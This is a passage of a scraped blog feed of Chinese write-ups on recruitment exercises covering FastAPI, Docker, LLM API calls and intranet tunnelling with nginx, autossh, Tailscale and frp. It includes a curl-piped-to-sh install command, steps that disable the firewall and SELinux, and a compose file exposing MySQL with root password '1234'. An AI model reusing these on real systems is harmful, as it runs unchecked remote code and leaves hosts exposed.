prefix=\u0026#34;/items\u0026#34;) 分离路由：确保 users 相关的路由（如 /users/{user_id}）和 items 相关的路由（如 /items/{item_id}）分别在不同的文件中定义。 确保不同功能模块的路由（比如用户相关路由和物品相关路由）分别在不同的文件中定义，类似把代码解耦，便于维护\n使用方法：\n1 2 3 4 5 6 项目结构： project/ ├── main.py # 主应用入口 ├── routers/ # 存放所有路由模块的文件夹 │ ├── users.py # 用户相关路由（登录、注册等） │ └── items.py # 商品相关路由（查询、创建等） 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 # 组件中，创建 APIRouter 实例 router = APIRouter( prefix=\u0026#34;/users\u0026#34;, # 该模块所有路由的统一前缀（访问时需加 /users） tags=[\u0026#34;users\u0026#34;] # 文档中归类的标签（方便在 /docs 中区分） ) # 定义请求模型（可选，用于数据校验） class UserCreate(BaseModel): username: str email: str # 定义路由 @router.get(\u0026#34;/{user_id}\u0026#34;) def get_user(user_id: int): ... # main.py 中，创建主应用 app = FastAPI(title=\u0026#34;...\u0026#34;) # 注册路由（将 users_router 和 items_router 挂载到主应用） app.include_router(users_router) # 这样会自动匹配 users_router 的前缀 中间件与生命周期管理 中间件：为你的 FastAPI 应用添加一个自定义中间件，该中间件能够记录每个请求的耗时，并将信息打印到控制台。 中间件是在请求到达路由和响应返回客户端之间执行的代码，可用于日志记录、权限校验、耗时统计等。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 from fastapi import FastAPI, Request import time import asyncio app = FastAPI() @app.middleware(\u0026#34;http\u0026#34;) async def log_request_time(request: Request, call_next): # 这里的 call_next 会自动填充 print(\u0026#34;中间件开始执行\u0026#34;, flush=True) # 强制刷新 start_time = time.time() response = await call_next(request) process_time = (time.time() - start_time) * 1000 print(f\u0026#34;请求 {request.method} {request.url.path} 耗时: {process_time:.2f}ms\u0026#34;, flush=True) # 强制刷新 return response @app.get(\u0026#34;/test\u0026#34;) async def test_route(): await asyncio.sleep(1) return {\u0026#34;message\u0026#34;: \u0026#34;测试成功\u0026#34;} 测试的时候，用 vscode 的终端启动会看不到输出，换成了 cmd 才可以\n异步状态管理：使用 app.on_event(\u0026quot;startup\u0026quot;) 和 app.on_event(\u0026quot;shutdown\u0026quot;) 钩子，编写一个函数来初始化数据库连接池，并在应用关闭时安全地断开连接。 FastAPI class - FastAPI：on_event is deprecated, use lifespan event handlers instead.\n错误处理更优雅：Lifespan 可以通过上下文管理器（async with）捕获启动 / 关闭过程中的异常，确保资源正确清理。 代码组织更清晰：将启动和关闭逻辑集中在一个 Lifespan 类中，比分散的 on_event 装饰器更易维护。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 from fastapi import FastAPI from contextlib import asynccontextmanager import asyncpg # 定义 lifespan 上下文管理器 @asynccontextmanager async def lifespan(app: FastAPI): # 启动阶段：初始化资源 print(\u0026#34;应用启动中...\u0026#34;) # 全局连接池对象 app.state.db_pool = await asyncpg.create_pool( user=\u0026#34;user\u0026#34;, password=\u0026#34;password\u0026#34;, database=\u0026#34;db\u0026#34;, host=\u0026#34;localhost\u0026#34; ) yield # 应用正常运行阶段，yield 后执行关闭逻辑 # 关闭阶段：清理资源 print(\u0026#34;应用关闭中...\u0026#34;) if hasattr(app.state, \u0026#34;db_pool\u0026#34;): await app.state.db_pool.close() print(\u0026#34;数据库连接池已关闭\u0026#34;) app = FastAPI(lifespan=lifespan) # 测试路由：使用数据库连接池 @app.get(\u0026#34;/db-test\u0026#34;) async def db_test(): async with app.state.db_pool.acquire() as conn: result = await conn.fetch(\u0026#34;SELECT NOW()\u0026#34;) return {\u0026#34;current_time\u0026#34;: result[0][\u0026#34;now\u0026#34;]} ","date":"2025-10-20T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-python%E5%90%8E%E7%AB%AF/","title":"御林招新题：python 后端"},{"content":"多阶段构建（Multi-stage build） 目标：优化你的镜像大小，只包含运行应用所需的最小组件。 什么是多阶段构建？ 允许在一个 Dockerfile 中定义多个构建阶段，每个阶段可以使用不同的基础镜像，最终只将必要的文件复制到最终镜像中，从而剔除构建过程中产生的冗余内容（如编译工具、临时文件、开发依赖等）。 构建阶段：使用包含编译 / 打包工具的镜像，完成代码编译、依赖安装等操作； 运行阶段：使用轻量级基础镜像（如 alpine），仅复制构建阶段的产物（如可执行文件、Jar 包），最终镜像只包含运行所需的最小环境。 1 2 3 4 5 6 7 8 9 10 11 12 # 第一阶段：构建阶段（可命名） FROM 基础镜像1 AS 阶段名1 # 执行构建操作（如编译、安装依赖） RUN 命令1 COPY 源码 目标路径 # 第二阶段：运行阶段（最终镜像） FROM 基础镜像2 AS 阶段名2 # 从第一阶段复制构建产物 COPY --from=阶段名1 构建阶段的产物路径 最终镜像的目标路径 # 定义运行命令 CMD [\u0026#34;启动命令\u0026#34;] 第一阶段去哪里了？ 第一阶段的产物，要么被主动复制到最终镜像（成为运行时必需的部分），要么作为中间层被 Docker 缓存（用于加速后续构建，但不进入最终镜像）。 挑战：\n编写一个 Dockerfile，使用多阶段构建来打包一个简单的 Web 应用（例如，一个基于 Python Flask 的应用）。 1 2 3 4 5 6 7 8 9 10 from flask import Flask app = Flask(__name__) @app.route(\u0026#39;/\u0026#39;) def hello(): return \u0026#39;Hello from Flask!\u0026#39; if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=5000) 在第一阶段，使用完整的开发镜像（例如 python:3.9）来安装依赖并构建应用。\n在第二阶段，使用一个轻量级的运行时镜像（例如 python:3.9-slim 或 alpine）作为基础，只将第一阶段构建好的应用代码和必要的依赖文件复制过来。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # 第一阶段：构建阶段，使用完整的开发镜像 FROM python:3.9 as builder # 设置工作目录 WORKDIR /app # 复制依赖文件并安装 COPY requirements.txt . RUN pip install -r requirements.txt # 复制应用代码 COPY app.py . # 第二阶段：运行阶段，使用轻量级的运行时镜像 FROM python:3.9-slim # 设置工作目录 WORKDIR /app # 从构建阶段复制必要的文件（安装好的依赖和应用代码） COPY --from=builder /app/requirements.txt . COPY --from=builder /app/app.py . COPY --from=builder /usr/local/lib/python3.9/site-packages/ /usr/local/lib/python3.9/site-packages/ # 暴露应用端口 EXPOSE 5000 # 启动应用 CMD [\u0026#34;python\u0026#34;, \u0026#34;app.py\u0026#34;] 1 2 3 4 5 6 7 8 9 10 11 12 13 # 单阶段 FROM python:3.9 WORKDIR /app COPY requirements.txt . RUN pip install -r requirements.txt COPY app.py . EXPOSE 5000 CMD [\u0026#34;python\u0026#34;, \u0026#34;app.py\u0026#34;] 验证：分别构建一个单阶段镜像和一个多阶段镜像，并使用 docker images 命令比较它们的大小，说明多阶段构建的优势。 1 2 3 4 [root@localhost docker_stage_2]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE multi_stage latest e9c0c0a489a8 16 minutes ago 148MB docker_nostage latest 033ed26b2d7f 16 minutes ago 1.1GB 多阶段可以删去不必要的组件，精简了镜像的大小\n单阶段使用的 python:3.9 基于完整的 Debian 系统，多阶段最终使用的 python:3.9-slim 是精简版 为什么不能直接用 slim 构建？\n如果直接用 slim 镜像构建（单阶段），执行 pip install -r requirements.txt 时，若遇到需要编译的包，会因缺少 gcc 等工具而失败，报错类似：error: command 'gcc' failed: No such file or directory，所以需要构建后再复制编译后的模块 怎么知道所需要保留的包的路径？\n可以创建临时容器：docker run -it --rm python:3.9 /bin/bash，进入后 python -m site 或 pip show flask | grep \u0026quot;Location\u0026quot; 也可以先构建一个单阶段容器，在 dockerfile 中输出依赖路径，再作修改 镜像版本管理与标签（Tagging） 目标：为你的镜像打上清晰的版本标签，方便管理和追溯。\n挑战：\n为你上一步构建的多阶段镜像打上至少两个标签（例如 your-app:1.0.0 和 your-app:latest）。 使用 docker images 命令验证标签是否正确应用。 docker tag \u0026lt;ID\u0026gt; name:\u0026lt;tag\u0026gt;\n1 2 3 4 5 [root@localhost docker_stage_2]# docker tag e9c0c0a489a8 multi:latest [root@localhost docker_stage_2]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE multi 1.0.0 e9c0c0a489a8 29 minutes ago 148MB multi latest e9c0c0a489a8 29 minutes ago 148MB 镜像的打包与加载 目标：掌握在没有 Docker Registry 的情况下，迁移镜像的方法。 docker save -o your-app-1.0.0.tar your-app:1.0.0\n挑战：\n使用 docker save 命令将你构建的镜像（your-app:1.0.0）打包成一个 .tar 文件。 将该 .tar 文件复制到另一台机器（或在当前机器上删除本地镜像），然后使用 docker load 命令加载该 .tar 文件。 删除镜像 docker rmi your-app:1.0.0\n加载镜像 docker load -i target\n验证：使用 docker images 命令，确认镜像已成功加载，并可以正常运行。 [root@localhost docker_stage_2]# docker load -i multi-1.0.0.tar Loaded image: multi:1.0.0 [root@localhost docker_stage_2]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE multi 1.0.0 e9c0c0a489a8 35 minutes ago 148MB\n推送到私有仓库 目标：将你的镜像推送到一个私有的 Docker Registry，模拟团队协作环境。\n挑战：\n在本地运行一个临时的 Docker Registry 容器。 使用 docker tag 命令为你的镜像打上指向该私有仓库的标签（例如 localhost:5000/your-app:1.0.0）。 使用 docker push 命令将镜像推送到本地私有仓库。 验证：使用 docker pull 命令从该私有仓库拉取镜像，确认推送和拉取流程畅通。 1 2 3 4 5 6 [root@localhost docker_stage_2]# docker rmi multi_stage:latest Untagged: multi_stage:latest Deleted: sha256:e9c0c0a489a800d997c60d99cfc4fd11b7416afdb10f80e5d1f5b68bfdf5a16b [root@localhost docker_stage_2]# docker load -i multi-1.0.0.tar Loaded image: multi:1.0.0 [root@localhost docker_stage_2]# docker run -p 8001:5000 multi:1.0.0 如果 rmi 的时候镜像有多个 tag，只会删除 tag，只有只剩一个 tag 时会彻底删除镜像\n属于一个 compose 的要如何一起 stop？ 在 docker-compose.yml 文件所在的目录下，使用 docker compose stop 命令 ","date":"2025-10-19T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-docker%E8%BF%9B%E9%98%B6/","title":"御林招新题：docker 进阶"},{"content":"安装与配置 Docker 在你的 Linux 操作系统上，安装 Docker Engine。 配置 Docker 的国内镜像源，以加快镜像下载速度。 验证：执行 docker version 和 docker info 命令，确认 Docker 已正确安装并配置。 参考之前写的：配置docker\n运行你的第一个容器 使用 docker pull 命令拉取 hello-world 镜像。 使用 docker run 命令运行一个 hello-world 容器，观察其输出。 1 2 3 4 5 6 7 [root@localhost ~]# docker run hello-world Hello from Docker! This message shows that your installation appears to be working correctly. To generate this message, Docker took the following steps: ...... 运行一个 searxng 容器。 使用 docker run 命令，将 searxng 容器运行在后台。 将容器的 8080 端口映射到主机的 8080 端口。 验证：在浏览器中访问 http://localhost:8080，确认 searxng 网页正常显示。 1 2 [root@localhost ~]# docker pull searxng/searxng [root@localhost ~]# docker run -d -p 8080:8080 searxng/searxng docker run: -d：后台运行容器（守护进程模式）。 -p 主机端口:容器端口：端口映射（外部可通过主机端口访问容器服务）。 -v 主机目录:容器目录：挂载数据卷（持久化数据，容器删除后数据不丢失）。 --name 容器名：指定容器名称（方便后续操作）。 -it：交互式运行（用于进入容器终端，如 bash） 核心概念理解 解释题：请用你自己的话，简要解释以下核心概念，并说明它们之间的关系。 镜像（Image） 类似安装包，整合了所需的运行环境。创建了就不会被更改。 容器（Container） 基于镜像安装后的实例应用，而且是独立的，可以启动、删除等等，同时是一个隔离出来的沙箱环境 Dockerfile 自己构建镜像的工具，在这个文档中编写镜像所需的环境（而非一个一个手动安装），实现自动化构建 了解 Docker Compose 什么是 Docker Compose？它解决了什么问题？ Docker 官方提供的一个工具，用于定义和运行多容器 Docker 应用程序。 将多个 docker 容器整合到一起，可以统一操作（而不用一个一个开启、关闭）。并且可以一起配置网络、数据卷挂载等等。 简要说明 Docker Compose 文件（docker-compose.yml）的作用。 Docker Compose 的核心配置文件，具体实现多个 docker 容器的协同。可以定义 compose 中的： 服务：指定适用镜像、映射端口等 网络：使不同容器可以在一个网络中通信 数据卷：在容器之间或者容器与主机之间共享数据 编写你的第一个 Dockerfile 挑战：编写一个 Dockerfile，实现以下功能： 基于一个最新的 ubuntu 镜像。 在容器中安装 nginx。 设置 nginx 服务在容器启动时自动运行。 验证：使用 docker build 命令构建你的镜像，并使用 docker run 命令运行该容器，确保 nginx 服务正在运行。 1 2 3 4 5 6 7 8 9 10 11 12 # 基于最新的 Ubuntu 镜像 FROM ubuntu:latest # 安装 nginx # 首先更新 Ubuntu 的软件包列表，然后安装 nginx，最后清理软件包缓存以减小镜像体积 RUN apt-get update \u0026amp;\u0026amp; \\ apt-get install -y nginx \u0026amp;\u0026amp; \\ rm -rf /var/lib/apt/lists/* # 设置 nginx 服务在容器启动时自动运行 # CMD 指令指定容器启动时要执行的命令，这里让 nginx 以前台方式运行，保证容器不退出 CMD [\u0026#34;nginx\u0026#34;, \u0026#34;-g\u0026#34;, \u0026#34;daemon off;\u0026#34;] 1 2 3 4 [root@localhost ~]# docker build -t my-ubuntu-nginx . ...... [root@localhost ~]# docker run -d -p 80:80 my-ubuntu-nginx 为什么不用下载整个 ubuntu 镜像？ Docker 中的 ubuntu 镜像本质是 “精简的根文件系统（rootfs）”，仅包含运行 Ubuntu 环境所需的核心组件，共享宿主机的 Linux 内核，只保留基础命令，去除图形化 使用 Docker Compose 部署多服务应用 挑战：编写一个 docker-compose.yml 文件，实现以下功能： 服务一：部署一个 nginx 服务，将其 80 端口映射到主机的 8081 端口。 服务二：部署一个 mysql 服务，并设置环境变量 MYSQL_ROOT_PASSWORD。 验证：使用 docker compose up -d 命令一键启动这两个服务，并使用 docker ps 确认两个容器都已成功运行。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 version: \u0026#39;3\u0026#39; services: # 服务一：Nginx 服务 nginx-service: image: nginx:latest ports: - \u0026#34;8081:80\u0026#34; # 将容器的 80 端口映射到主机的 8081 端口 # 服务二：MySQL 服务 mysql-service: image: mysql:latest environment: MYSQL_ROOT_PASSWORD: 1234 ports: - \u0026#34;3306:3306\u0026#34; 1 2 3 4 5 6 [root@localhost docker_compose_test]# vi docker-compose.yml [root@localhost docker_compose_test]# docker compose up -d [root@localhost docker_compose_test]# docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 70b31fae2377 mysql:latest \u0026#34;docker-entrypoint.s…\u0026#34; 3 minutes ago Up 3 minutes 3306/tcp, 33060/tcp docker_compose_test-mysql-service-1 d61344588b2e nginx:latest \u0026#34;/docker-entrypoint.…\u0026#34; 3 minutes ago Up 3 minutes 0.0.0.0:8081-\u0026gt;80/tcp, :::8081-\u0026gt;80/tcp docker_compose_test-nginx-service-1 ","date":"2025-10-19T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-docker%E5%85%A5%E9%97%A8/","title":"御林招新题：docker 入门"},{"content":" LLM：Large Language Model\n准备工作：获取 API Key 注册一个 LLM 服务提供商的账号，推荐使用硅基流动（）。 有 qwen 的 Token了……\n申请并获取你的 API Key。 编程调用 API 看看文档：大模型服务平台百炼控制台，官方提供了基本示例代码\n选择一门你熟悉的编程语言，推荐使用 Python。 安装必要的库（推荐使用openai库）。 编写一个脚本，向 API 发送一个简单的请求。 解析 API 的返回结果，并将模型的回复打印到控制台。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 import os from openai import OpenAI try: client = OpenAI( # 若没有配置环境变量，请用阿里云百炼API Key将下行替换为：api_key=\u0026#34;sk-xxx\u0026#34;, # 新加坡和北京地域的API Key不同。获取API Key：https://help.aliyun.com/zh/model-studio/get-api-key api_key=\u0026#34;......\u0026#34;, # 以下是北京地域base_url，如果使用新加坡地域的模型，需要将base_url替换为：https://dashscope-intl.aliyuncs.com/compatible-mode/v1 base_url=\u0026#34;https://dashscope.aliyuncs.com/compatible-mode/v1\u0026#34;, ) completion = client.chat.completions.create( model=\u0026#34;qwen-plus\u0026#34;, # 模型列表：https://help.aliyun.com/zh/model-studio/getting-started/models messages=[ {\u0026#39;role\u0026#39;: \u0026#39;system\u0026#39;, \u0026#39;content\u0026#39;: \u0026#39;你是一个耐心的助手，熟悉计算机技能\u0026#39;}, {\u0026#39;role\u0026#39;: \u0026#39;user\u0026#39;, \u0026#39;content\u0026#39;: \u0026#39;简述DevOps是什么\u0026#39;} ] ) print(completion.choices[0].message.content) except Exception as e: print(f\u0026#34;错误信息：{e}\u0026#34;) print(\u0026#34;请参考文档：https://help.aliyun.com/zh/model-studio/developer-reference/error-code\u0026#34;) 结果：\n1 2 3 4 5 6 7 8 9 10 11 12 13 PS D:\\code\\test\u0026gt; \u0026amp; C:/python/python3.exe d:/code/test/llm.py DevOps 是一组结合开发（Development）和运维（Operations）的实践方法，旨在缩短软件开发生命周期，提高软件交付的速度与质量。它通 过自动化、协作和持续改进，实现开发团队与运维团队之间的高效协同。 核心理念包括： 1. **持续集成（CI）**：开发人员频繁地将代码变更合并到主分支，并通过自动化测试验证。 2. **持续交付/部署（CD）**：确保代码可以随时安全地部署到生产环境，部分实现自动发布。 3. **自动化**：涵盖构建、测试、部署和监控等各个环节，减少人为错误，提升效率。 4. **监控与反馈**：实时监控系统运行状态，快速发现问题并反馈给开发团队。 5. **协作与文化**：强调团队之间的沟通、协作和责任共担，打破“开发”与“运维”之间的壁垒。 常用工具包括：Git、Jenkins、Docker、Kubernetes、Ansible、Prometheus、ELK 等。 模型能力探索 尝试调用至少三个不同的模型。 向每个模型提问相同的问题，例如“简述DevOps是什么？”或“请编写一个用 Python 计算斐波那契数列的函数”。 观察并分析不同模型之间的回答风格、准确性、速度和内容差异。 qwen-plus: 1 2 3 4 5 6 7 8 9 10 11 12 DevOps 是一组结合开发（Development）和运维（Operations）的实践方法，旨在缩短软件开发生命周期，提高软件交付的速度与质量。它通 过自动化、协作和持续改进，实现开发团队与运维团队之间的高效协同。 核心理念包括： 1. **持续集成（CI）**：开发人员频繁地将代码变更合并到主分支，并通过自动化测试验证。 2. **持续交付/部署（CD）**：确保代码可以随时安全地部署到生产环境，部分实现自动发布。 3. **自动化**：涵盖构建、测试、部署和监控等各个环节，减少人为错误，提升效率。 4. **监控与反馈**：实时监控系统运行状态，快速发现问题并反馈给开发团队。 5. **协作与文化**：强调团队之间的沟通、协作和责任共担，打破“开发”与“运维”之间的壁垒。 常用工具包括：Git、Jenkins、Docker、Kubernetes、Ansible、Prometheus、ELK 等。 qwen-max 1 2 3 4 5 6 7 8 9 10 11 DevOps是一种文化和实践的集合，旨在通过促进开发（Development）、技术运营（Operations）以及其它相关团队之间的沟通、协作与整合，来提高软件开发和交付的速度及质量。它强调在整个软件生命周期中采用自动化工具和技术，以实现持续集成、持续交付/部署（CI/CD），从 而更快地响应市场变化，并提高组织的灵活性。 DevOps的核心理念包括但不限于： - **文化转型**：鼓励跨职能团队合作，打破传统IT部门间的壁垒。 - **自动化**：利用各种工具自动化构建、测试和部署过程，减少人为错误，加快迭代速度。 - **持续改进**：基于反馈循环不断优化流程，追求更高效的工作方式。 - **测量与监控**：重视性能指标的收集与分析，确保系统稳定性和服务质量。 总之，DevOps旨在通过加强不同角色之间的协作，结合敏捷方法论与自动化技术，帮助企业更快地将高质量的产品推向市场 deepseek-v3.2-exp 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 DevOps 是一种结合软件开发（Development）与 IT 运维（Operations）的文化理念与实践方法，旨在通过自动化与协作，缩短软件开发生命 周期，提升交付效率、系统稳定性与产品质量。 ### 核心目标： 1. **快速交付**：通过自动化流程（如 CI/CD）加速软件发布。 2. **高质量输出**：持续测试与监控，及早发现并修复问题。 3. **跨团队协作**：打破开发与运维之间的壁垒，促进沟通与责任共担。 ### 关键实践： - **持续集成/持续部署（CI/CD）**：自动化构建、测试和部署流程。 - **基础设施即代码（IaC）**：用代码管理服务器和配置，确保环境一致性。 - **自动化测试与监控**：实时跟踪系统性能，快速响应故障。 ### 常用工具链示例： - **代码管理**：Git、GitLab - **CI/CD**：Jenkins、GitHub Actions - **容器化**：Docker、Kubernetes - **监控**：Prometheus、Grafana 通过融合文化、流程与工具，DevOps 帮助团队更灵活地应对市场需求，实现高效可靠的软件交付。 构建一个命令行聊天机器人 功能实现：编写一个 Python 脚本，创建一个可以持续与用户交互的命令行聊天机器人。 交互循环：使用一个无限循环，不断接收用户的输入，并将其作为提示词（Prompt）发送给 LLM。 对话管理：将 LLM 的回复打印回命令行，然后再次等待用户的输入。 退出机制：当用户输入特定指令（例如 quit 或 exit）时，程序能够优雅地退出。 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 # 改成了流式输出 import os from openai import OpenAI client = OpenAI( # 若没有配置环境变量，请用百炼API Key将下行替换为：api_key=\u0026#34;sk-xxx\u0026#34;, api_key=\u0026#34;......\u0026#34;, base_url=\u0026#34;https://dashscope.aliyuncs.com/compatible-mode/v1\u0026#34;, ) prompt = input() while(prompt != \u0026#34;exit\u0026#34; and prompt != \u0026#34;quit\u0026#34;): completion = client.chat.completions.create( model=\u0026#34;qwen-plus\u0026#34;, # 此处以qwen-plus为例，可按需更换模型名称。模型列表：https://help.aliyun.com/zh/model-studio/getting-started/models messages=[{\u0026#39;role\u0026#39;: \u0026#39;system\u0026#39;, \u0026#39;content\u0026#39;: \u0026#39;You are a helpful assistant.\u0026#39;}, {\u0026#39;role\u0026#39;: \u0026#39;user\u0026#39;, \u0026#39;content\u0026#39;: prompt}], stream=True, stream_options={\u0026#34;include_usage\u0026#34;: True} ) for chunk in completion: # 提取当前片段中的文本内容（delta.content） if chunk.choices: # 这里得判断一下 content = chunk.choices[0].delta.content if content: # 只打印非空内容（过滤空片段） print(content, end=\u0026#34;\u0026#34;, flush=True) # 实时输出，不换行 print() # 每个回复结束后换行 prompt = input() print(\u0026#34;拜拜~\u0026#34;) 提示词工程（Prompt Engineering） 角色扮演：修改你的聊天机器人脚本，让模型扮演一个特定角色，例如“一位严厉的Linux导师”或“一个幽默的段子手”。 指令遵循：尝试给模型一些复杂的指令，例如“用 Markdown 格式列出所有重要的 Linux 命令，并为每个命令提供一个简短的例子。” 限制输出：要求模型在回答问题时，遵循特定的格式或长度限制，例如“只用100字以内回答。” 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 import os from openai import OpenAI ...... system = input(\u0026#34;请输入你想让我扮演的角色：\u0026#34;) # 更新了这里 prompt = input(\u0026#34;你想对我说什么？\u0026#34;) while(prompt != \u0026#34;exit\u0026#34; and prompt != \u0026#34;quit\u0026#34;): completion = client.chat.completions.create( model=\u0026#34;qwen-plus\u0026#34;, # 此处以qwen-plus为例，可按需更换模型名称。模型列表：https://help.aliyun.com/zh/model-studio/getting-started/models messages=[{\u0026#39;role\u0026#39;: \u0026#39;system\u0026#39;, \u0026#39;content\u0026#39;: system}, {\u0026#39;role\u0026#39;: \u0026#39;user\u0026#39;, \u0026#39;content\u0026#39;: prompt}], stream=True, stream_options={\u0026#34;include_usage\u0026#34;: True} ) ...... prompt = input(\u0026#34;再说点什么呢？\u0026#34;) print(\u0026#34;拜拜~\u0026#34;) ","date":"2025-10-19T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-llm%E4%B8%93%E9%A2%98/","title":"御林招新题：LLM 专题"},{"content":"Nginx 反向代理 什么是反向代理？ 反向代理是一种服务器架构模式，客户端向反向代理服务器发起请求，反向代理服务器再将请求转发到内部网络中的实际服务器（内网服务），并将实际服务器的响应返回给客户端。从客户端角度看，仿佛是直接和反向代理服务器交互，无需知晓背后内网服务的存在。Nginx 作为高性能的 Web 服务器和反向代理服务器，很适合承担这个角色。 任务：在一台可以从公网访问的服务器（或本地虚拟机）上安装 Nginx，并将其配置为反向代理，以转发流量到你的内网服务（例如，在另一台机器上运行的 Web 服务器）。\n具体操作：\n在公网服务器上安装 Nginx。 修改 Nginx 配置文件，添加一个 server 块，并使用 proxy_pass 指令将请求转发到你的内网 IP 地址和端口。 1 2 3 4 5 6 7 8 9 10 11 12 13 # /etc/nginx/conf.d/reverse-proxy.conf # 需要先把 /etc/nginx/nginx.conf 里监听 80 端口的 server 注释掉 server { listen 80; # 监听80端口（HTTP默认端口） server_name 8.137.38.223; # 公网服务器的IP地址 location / { proxy_pass http://127.0.0.1:8001; # 转发到内网Web服务器的IP和端口 proxy_set_header Host $host; # 传递请求头中的Host信息，确保内网服务器能正确识别 proxy_set_header X-Real-IP $remote_addr; # 传递真实客户端IP proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; # 记录代理链的IP } } 验证：通过公网 IP 访问 Nginx 服务器，确认能成功显示内网服务的页面。 Autossh 端口转发 任务：使用 autossh 建立一个持久的 SSH 反向隧道，将内网服务的端口暴露到公网服务器上。 SSH 反向隧道：通常情况下，SSH 隧道是从客户端（能访问公网的机器）主动连接到服务端（公网服务器），实现从客户端到服务端的端口转发。而反向隧道则是让服务端（公网服务器）主动连接到客户端（内网机器），从而将内网机器的端口暴露到公网服务器上，使得公网可以访问内网服务。 Autossh：是 SSH 的一个封装工具，它能够自动监控 SSH 连接的状态，当连接断开时会自动重新建立连接，保证隧道的持久性，避免因为网络波动等原因导致隧道中断后需要手动重新建立。 具体操作： 在内网机器上安装 autossh。 执行 autossh 命令，将内网服务的端口（例如 8080）反向隧道到公网服务器的一个指定端口（例如 8000）。 配置 ssh 公钥： 内网：ssh-keygen 上传到服务器：ssh-copy-id -i /root/key.pub user@8.137.38.223 1 autossh -M 20000 -fCNR public_server_ip:8000:localhost:5000 root@public_server_ip 各参数解释： -M 20000：指定一个监视端口，autossh 通过这个端口来监视 SSH 连接的状态，确保连接的持久性。 -f：将 autossh 放入后台运行。 -C：启用压缩，减少数据传输的大小，提高传输效率。 -N：不执行远程命令，只进行端口转发。 -R public_server_ip:8000:localhost:8080：建立反向隧道，将公网服务器的8000端口转发到内网机器的localhost:8080（即内网服务的端口）。user是公网服务器上的用户名。 验证：通过访问公网服务器的 8000 端口，确认能访问到内网服务。 docker ps -a 看所有容器；docker rm 删除\ndocker insepct \u0026lt;image\u0026gt; 看一下端口\n配了很久，要注意的点： autossh 指令：public_server_ip:8000 这里要写 0.0.0.0，不然只能服务器本地访问 不知道为什么密钥上传了但是没用 需要将服务器上的 /etc/ssh/sshd_config 中 GatewayPorts 改为 yes，否则隧道仅允许目标服务器本地访问 8000 端口 netstat -tuln | grep 8000 看服务器 ssh 连接状态； ps（process status） aux | grep autossh 看内网的 autossh 命令 云服务器还要看一下安全组是不是拦截了 Tailscale 零配置网络 任务：使用 Tailscale 建立一个零配置的虚拟私有网络（VPN），实现内网设备的点对点互联。 不需要复杂的网络配置（如端口转发、防火墙规则调整等），就能让分布在不同网络环境（如内网、公网）的设备，像在同一个局域网内一样实现点对点的互联互通。Tailscale 用于简化 VPN 搭建流程\n具体操作：\n在你的公网服务器和内网机器上分别安装 Tailscale。 curl -fsSL https://tailscale.com/install.sh | sh\n注册 https://login.tailscale.com/\n使用你的账户登录并加入 Tailscale 网络。 1 2 3 4 5 6 7 8 [root@localhost ~]# tailscale ip 100.124.165.66 [root@iZ2vc96n4f90pw7f8dfbfsZ ~]# tailscale ip 100.75.140.47 # 访问 OK [root@iZ2vc96n4f90pw7f8dfbfsZ ~]# curl http://100.124.165.66:5000 Hello from Flask! 验证：在公网服务器上，通过内网机器的 Tailscale IP 或主机名直接访问其内网服务，无需任何端口转发。 Frp (Fast Reverse Proxy) 任务：使用 Frp 客户端-服务端模式，将内网服务暴露到公网。 Frp（Fast Reverse Proxy）是一款专注于内网穿透的高性能反向代理应用\n下载 wget https://github.com/fatedier/frp/releases/download/v0.32.1/frp_0.32.1_linux_amd64.tar.gz\n安装参考：CentOS 7 部署frp穿透内网_centos frp-CSDN博客\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 # 关防火墙 systemctl stop firewalld \u0026amp;\u0026amp; systemctl disable firewalld # 关 SELinux setenforce 0 # 创建安装路径 mkdir -p /usr/local/frps # 解压备用 tar zxvf frp_0.32.1_linux_amd64.tar.gz -C /tmp # 复制 frps 和 frps.ini 两个配置文件 # 注意！！！ 客户端要复制的是 frpc 和 frpc.ini cd /tmp/frp_0.32.1_linux_amd64 cp frps frps.ini /usr/local/frps # 配置 vim /usr/local/frps/frps.ini 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # 内网 frpc.ini [common] server_addr = 8.137.38.223 # 公网服务器 IP server_port = 7000 # 服务端 bind_port [web_tcp] # 模块名可自定义 type = tcp # 改为 TCP 类型 local_ip = 127.0.0.1 local_port = 5000 remote_port = 8001 # 公网服务器上用于访问的端口（需和服务端端口不冲突??冲突！） # 服务器 frps.ini [common] bind_port = 7000 # Frp 服务端与客户端通信的端口 vhost_http_port = 8080 # 若要通过 HTTP 访问内网 Web 服务，设置此端口 具体操作：\n在一台公网服务器上运行 frps（服务端）。\n在内网机器上运行 frpc（客户端），并配置其连接到服务端，将内网服务的端口暴露出去。\n启动 ./frps -c ./frps.ini\n验证：通过公网服务器的 IP 和 Frp 配置的端口，确认能访问到内网服务。 错了几个点：\n运行内网的时候运行成 frps 了 ……\n如果配置为 http 的话，还需要域名，所以改成了 tcp\n","date":"2025-10-19T00:00:00Z","permalink":"https://calendar0917.github.io/posts/%E5%BE%A1%E6%9E%97-%E7%BD%91%E7%BB%9C%E8%BD%AC%E5%8F%91/","title":"御林招新题：内网穿透与流量转发专题"},{"content":"文件共享协议理解 任务：简要解释 SMB/CIFS 和 SFTP 这两种文件共享协议的作用和主要区别。 